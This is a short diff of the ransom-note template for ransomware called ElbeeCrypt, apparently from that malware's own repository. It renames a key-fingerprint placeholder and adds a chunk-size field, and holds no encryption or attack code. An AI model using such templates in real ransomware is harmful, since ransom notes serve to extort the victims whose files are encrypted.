@@ -4,7 +4,8 @@ If you are reading this, it means your personal files were locked by ElbeeCrypt,
 
 Encryption scheme: %encryption_scheme%
 Keypair type: %keypair_type%
-Public key fingerprint: %public_key_fingerprint%
+Key fingerprint: %key_fingerprint%
+Chunk size: %chunk_size% bytes
 Targeted extensions: %target_extensions%
 Root directories: %root_directories%
 Encrypted extension: %encrypted_extension%
